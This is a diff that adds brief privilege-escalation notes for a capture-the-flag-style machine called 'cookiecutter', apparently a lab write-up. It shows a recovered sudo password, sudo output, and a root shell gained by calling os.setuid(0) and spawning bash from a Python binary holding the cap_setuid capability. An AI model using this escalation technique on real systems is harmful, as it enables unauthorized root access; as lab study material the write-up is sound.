@@ -1,0 +1,40 @@
+Foothold: see exploit script
+
+PrivEsc:
+
+Step 1: Decode source.c by printing out the password
+
+I_Pr3f3r_C4k3!
+
+Step 2:
+
+bob@cookiecutter:~/.code$ sudo -l 
+sudo -l
+[sudo] password for bob: I_Pr3f3r_C4k3!
+
+Matching Defaults entries for bob on cookiecutter:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bob may run the following commands on cookiecutter:
+    (bob : python_admin) /usr/bin/admin_python3
+    
+sudo -g python_admin /usr/bin/admin_python3
+sudo -g python_admin /usr/bin/admin_python3
+Python 3.6.9 (default, Oct  8 2020, 12:12:24) 
+[GCC 8.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+import os
+>>> os.setuid(0)
+os.setuid(0)
+>>> os.system("bash")
+os.system("bash")
+root@cookiecutter:~/.code#
+
+Must setuid(0)
+
+more details can be found via running: getcap /usr/bin/admin_python3
+/usr/bin/admin_python3 = cap_setuid+ep
+
+After some research, we discover that this capability allows us to "Make arbitrary manipulations of process UIDs".
